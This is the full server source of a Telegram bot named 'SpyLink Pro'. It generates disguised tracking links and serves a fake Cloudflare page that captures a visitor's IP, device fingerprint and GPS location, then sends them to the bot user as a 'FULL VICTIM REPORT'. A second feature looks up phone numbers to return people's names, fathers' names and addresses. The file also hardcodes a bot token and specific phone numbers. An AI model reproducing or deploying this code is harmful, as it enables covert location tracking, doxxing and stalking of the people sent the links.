// server.js — v7.0: Custom Number API + Banned Numbers + Data Collection Fixes
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 HARDCODED PRIVATE CONFIG
const BOT_TOKEN = "8377073485:AAHaqfvexqBLoIM6v4uEjThnA11-4m0kb7U";
const ADMIN_CHAT_ID = "8175884349";
const HOST_URL = "https://botu-s3f9.onrender.com";

// ❌ BANNED NUMBERS (per your request)
const BANNED_NUMBERS = ["9161636853", "9451180555", "6306791897"];

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Crash Protection
process.on('unhandledRejection', console.error);
process.on('uncaughtException', console.error);

// Middleware
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('tiny'));
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.set("view engine", "ejs");

// Sessions Storage
let sessions = {};

// ==================== TELEGRAM BOT HANDLERS ====================

bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();

    // Handle reply for URL submission
    if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
      return handleUrlSubmission(chatId, text);
    }

    // Handle reply for phone number
    if (msg?.reply_to_message?.text === "📱 Send a phone number (e.g., 7800418265)") {
      return handleNumberInfo(chatId, text);
    }

    // Command Router
    switch (text) {
      case "/start":
        return sendWelcome(chatId);
      case "/create":
        return requestUrl(chatId);
      case "/numberinfo":
        return requestPhoneNumber(chatId);
      case "/help":
        return sendHelp(chatId);
      case "/menu":
        return sendMainMenu(chatId);
      case "/panel":
        if (String(chatId) === ADMIN_CHAT_ID) return showAdminPanel(chatId);
        else bot.sendMessage(chatId, "⛔ Admin access required.");
        break;
      default:
        break;
    }
  } catch (error) {
    console.error("Message handler error:", error);
  }
});

bot.on('callback_query', async (query) => {
  try {
    await bot.answerCallbackQuery(query.id);
    const chatId = query.message.chat.id;
    const data = query.data;

    // Admin Panel Navigation
    if (data === "admin_sessions") return viewAllSessions(chatId);
    if (data === "admin_stats") return sendStats(chatId);
    if (data === "admin_clear") return clearAllSessions(chatId);

    // Regular User Actions
    switch(data) {
      case "create_new":
        requestUrl(chatId);
        break;
      case "number_info":
        requestPhoneNumber(chatId);
        break;
      case "main_menu":
        sendMainMenu(chatId);
        break;
      case "help_cmd":
        sendHelp(chatId);
        break;
      case "back_to_panel":
        showAdminPanel(chatId);
        break;
    }
  } catch (error) {
    console.error("Callback error:", error);
  }
});

// ==================== NUMBER INFO — USING YOUR API ====================

async function handleNumberInfo(chatId, input) {
  // Clean number: remove +, spaces, dashes, etc.
  let number = input.replace(/\D/g, '');

  // Check if banned
  if (BANNED_NUMBERS.includes(number)) {
    return bot.sendMessage(chatId, "❌ This number is restricted for lookup.", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Try Another Number", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    });
  }

  if (!number || number.length < 10) {
    return bot.sendMessage(chatId, "❌ Invalid number. Send 10+ digits (e.g., 7800418265)", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Retry", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    });
  }

  try {
    const response = await axios.get(`https://demon.taitanx.workers.dev/?mobile=${number}`, {
      timeout: 8000
    });

    const result = response.data;

    if (!result.data || result.data.length === 0) {
      return bot.sendMessage(chatId, "🔍 No information found for this number.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "📱 Try Another", callback_data: "number_info" }],
            [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
          ]
        }
      });
    }

    // Format all records
    let message = `📞 *PHONE NUMBER INFO*\n\n`;
    let count = 0;

    for (let record of result.data) {
      if (count >= 3) break; // Limit to 3 records to avoid overflow

      // Format address (split by !)
      let addrLines = (record.address || "").split('!').filter(a => a.trim()).slice(0, 5);
      let formattedAddr = addrLines.join('\n          ');

      message += `📱 *Number:* \`${record.mobile}\`\n`;
      message += `👤 *Name:* ${record.name || 'N/A'}\n`;
      message += `👨 *Father:* ${record.fname || 'N/A'}\n`;
      message += `📬 *Address:*\n          ${formattedAddr || 'N/A'}\n`;
      if (record.alt) message += `📲 *Alt Number:* \`${record.alt}\`\n`;
      message += `📡 *Circle:* ${record.circle || 'N/A'}\n`;
      message += `---\n\n`;
      count++;
    }

    if (result.data.length > 3) {
      message += `ℹ️ *Showing first 3 of ${result.data.length} records.*\n`;
    }

    bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Check Another Number", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    });

  } catch (error) {
    console.error("Number API error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "⚠️ Failed to fetch info. Server may be down or number invalid.", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Retry", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    });
  }
}

function requestPhoneNumber(chatId) {
  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
    reply_markup: { force_reply: true }
  });
}

// ==================== ADMIN PANEL (UNCHANGED) ====================

function showAdminPanel(chatId) {
  const total = Object.keys(sessions).length;
  const reported = Object.values(sessions).filter(s => s.reported).length;

  let msg = `
🔐 *ADMIN PANEL*

📊 Total Sessions: *${total}*
✅ Reported: *${reported}*
⏳ Pending: *${total - reported}*
⏱️ Uptime: *${Math.floor(process.uptime())} sec*

🛠️ Choose action:
`;

  bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ View All Sessions", callback_data: "admin_sessions" }],
        [{ text: "📈 Server Stats", callback_data: "admin_stats" }],
        [{ text: "🗑️ Clear All Sessions", callback_data: "admin_clear" }],
        [{ text: "🔙 Main Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function viewAllSessions(chatId) {
  if (Object.keys(sessions).length === 0) {
    return bot.sendMessage(chatId, "📭 No sessions found.", {
      reply_markup: {
        inline_keyboard: [[{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]]
      }
    });
  }

  let msg = "*📋 SESSIONS LIST*\n\n";
  let count = 0;
  for (let [id, sess] of Object.entries(sessions)) {
    if (count >= 20) break;
    msg += `📄 *ID:* \`${id.substring(0,8)}...\`\n`;
    msg += `👤 User: \`${sess.chatId}\`\n`;
    msg += `✅ Status: ${sess.reported ? '✅ Delivered' : '⏳ Pending'}\n`;
    msg += `🌐 URL: ${sess.url ? sess.url.substring(0,30) + '...' : 'N/A'}\n`;
    msg += `🕒 Created: ${new Date(sess.createdAt).toLocaleTimeString()}\n`;
    msg += `📡 IP: ${sess.ip || 'N/A'}\n`;
    msg += `📍 Location: ${sess.location ? '✅ Captured' : '❌ Missing'}\n`;
    msg += "---\n";
    count++;
  }

  if (Object.keys(sessions).length > 20) {
    msg += `\n💡 Showing first 20 of ${Object.keys(sessions).length} sessions.\n`;
  }

  bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
      ]
    }
  });
}

function sendStats(chatId) {
  const mem = process.memoryUsage();
  const active = Object.keys(sessions).length;
  const reported = Object.values(sessions).filter(s => s.reported).length;

  let msg = `
📊 *SERVER STATS (ADMIN)*

📈 Active Sessions: ${active}
✅ Reported: ${reported}
⏳ Pending: ${active - reported}
⏱️ Uptime: ${Math.floor(process.uptime())} seconds
MemoryWarning: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB
📚 Total Keys: ${Object.keys(sessions).length}
`;

  bot.sendMessage(chatId, msg, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
      ]
    }
  });
}

function clearAllSessions(chatId) {
  const count = Object.keys(sessions).length;
  sessions = {};
  bot.sendMessage(chatId, `🗑️ Cleared ${count} sessions.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
      ]
    }
  });
}

// ==================== DATA COLLECTION — ENHANCED RELIABILITY ====================

app.post("/data", (req, res) => {
  try {
    const { uid, data } = req.body;
    if (!uid || !data) return res.status(400).send("Missing params");

    if (!sessions[uid]) {
      sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() }; // Fallback for old links
    }
    sessions[uid].data = decodeURIComponent(data);
    sessions[uid].ip = getIP(req);
    sessions[uid].lastDataReceived = new Date();

    // Trigger delivery check
    checkAndDeliver(uid);
    res.send("ok");
  } catch (error) {
    console.error("/data endpoint error:", error);
    res.status(500).send("Server Error");
  }
});

app.post("/location", (req, res) => {
  try {
    const { uid, lat, lon, acc } = req.body;
    if (!uid || !lat || !lon) return res.status(400).send("Invalid location");

    if (sessions[uid]) {
      sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc || 0) };
      sessions[uid].lastLocationReceived = new Date();
      checkAndDeliver(uid);
    }
    res.send("ok");
  } catch (error) {
    console.error("/location endpoint error:", error);
    res.status(500).send("Server Error");
  }
});

function checkAndDeliver(sessionId) {
  try {
    const session = sessions[sessionId];
    if (!session || session.reported || !session.data || !session.location) return;

    // Double-check data integrity
    if (!session.data.includes("VICTIM INFORMATION")) {
      console.warn("Suspicious data received, skipping delivery:", sessionId);
      return;
    }

    session.reported = true;
    session.deliveredAt = new Date();

    let formattedData = session.data
      .replaceAll("<br>", "\n")
      .replaceAll("<b>", "*")
      .replaceAll("</b>", "*")
      .replaceAll("<code>", "`")
      .replaceAll("</code>", "`")
      .replaceAll("&nbsp;", " ");

    let message = `
✅ *FULL VICTIM REPORT*

🆔 *Session ID:* \`${sessionId}\`
🌐 *Target URL:* ${session.url || 'N/A'}
📍 *Location:* https://maps.google.com/?q=${session.location.lat},${session.location.lon}
📡 *IP Address:* \`${session.ip || 'Unknown'}\`
🕒 *Report Time:* ${session.deliveredAt.toLocaleString()}

📱 *DEVICE & BROWSER FINGERPRINT:*
${formattedData}

🗺️ *GEOLOCATION DATA:*
• Latitude: \`${session.location.lat}\`
• Longitude: \`${session.location.lon}\`
• Accuracy: \`${session.location.accuracy} meters\`

⚠️ *Note:* Data collected in real-time from victim's device.
`;

    bot.sendMessage(session.chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🆕 Create New Link", callback_data: "create_new" }],
          [{ text: "📱 Lookup Number Info", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    }).catch(err => {
      console.error("Failed to send report to user:", err.message);
      // Mark as not delivered so it can retry if needed (optional)
      // session.reported = false;
    });
  } catch (error) {
    console.error("checkAndDeliver error:", error);
  }
}

// ==================== UTILITIES ====================

function getIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.connection?.remoteAddress ||
    '0.0.0.0'
  );
}

function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    bot.sendMessage(chatId, "❌ Invalid URL. Must start with http:// or https://");
    return requestUrl(chatId);
  }

  const sessionId = uuidv4();
  sessions[sessionId] = { chatId, url, createdAt: new Date() };

  const encoded = btoa(encodeURIComponent(url));
  const link = `${HOST_URL}/c/${sessionId}/${encoded}`;

  bot.sendMessage(chatId, `
🚀 *TRACKING LINK GENERATED*

🔗 *Target URL:* ${url}
🆔 *Session ID:* \`${sessionId}\`

🌐 *Send this stealth link to target:*
${link}

⏱️ *What happens when opened:*
• Instant device/browser fingerprinting
• GPS location capture (if permitted)
• Full report sent here in <10 seconds

👇 Use buttons below:
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Create Another", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function requestUrl(chatId) {
  bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
    reply_markup: { force_reply: true }
  });
}

function sendWelcome(chatId) {
  bot.sendMessage(chatId, `🎯 *Welcome to SpyLink Pro — Ultimate Recon Tool*

Features:
📍 Real-time GPS Tracking via Link
📱 50+ Device/Browser Data Points
📞 Advanced Phone Number Lookup
🔐 Full Admin Dashboard

👇 Start now:
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

function sendHelp(chatId) {
  bot.sendMessage(chatId, `📘 *USER GUIDE*

*TRACKING LINK:*
1. Tap “Create Tracking Link”
2. Send any URL (e.g., https://google.com)
3. Send generated link to target
4. Get full device + location report instantly

*PHONE NUMBER LOOKUP:*
→ Send 10-digit number (e.g., 7800418265)
→ Get name, father name, address, alt number, circle
→ Banned numbers: 9161636853, 9451180555, 6306791897

*COMMANDS:*
/start — Welcome screen
/create — Make tracking link
/numberinfo — Lookup phone number
/panel — Admin dashboard (restricted)
/menu — Show main menu

👨‍💻 Support: @aadi_io`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, `🏠 *MAIN MENU*

Choose an action:
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

// ==================== EXPRESS ROUTES — ENHANCED STABILITY ====================

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  try {
    const { sessionId, encodedUrl } = req.params;
    const url = decodeURIComponent(atob(encodedUrl));

    if (!sessions[sessionId]) {
      // Initialize session with chatId fallback
      sessions[sessionId] = { 
        chatId: parseInt(sessionId.split('-')[0], 36) || null, 
        createdAt: new Date() 
      };
    }
    sessions[sessionId].url = url;
    sessions[sessionId].lastAccess = new Date();

    res.render("cloudflare", {
      ip: getIP(req),
      time: new Date().toISOString().replace('T', ' ').substring(0, 19),
      url: url,
      uid: sessionId,
      a: HOST_URL,
      t: false
    });
  } catch (error) {
    console.error("Render cloudflare.ejs error:", error);
    res.status(500).send("Template Error");
  }
});

app.get("/", (req, res) => {
  res.json({
    status: "OK",
    version: "7.0-CUSTOM-API",
    sessions: Object.keys(sessions).length,
    uptime: process.uptime()
  });
});

// Auto cleanup every 30 minutes (aggressive to prevent memory bloat)
setInterval(() => {
  const now = new Date();
  let cleaned = 0;
  for (let id in sessions) {
    const session = sessions[id];
    const lastActive = session.lastAccess || session.lastDataReceived || session.lastLocationReceived || session.createdAt;
    const age = now - new Date(lastActive);
    if (age > 1800000) { // 30 minutes
      delete sessions[id];
      cleaned++;
    }
  }
  if (cleaned > 0) console.log(`🧹 Garbage Collection: Removed ${cleaned} stale sessions`);
}, 1800000);

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SpyLink Pro v7.0 — Custom Number API + Banned Numbers + Data Fixes`);
  console.log(`🔗 Listening on port ${PORT}`);
  console.log(`🌐 Host: ${HOST_URL}`);
  console.log(`🤖 Bot ready. Monitoring requests...`);
});
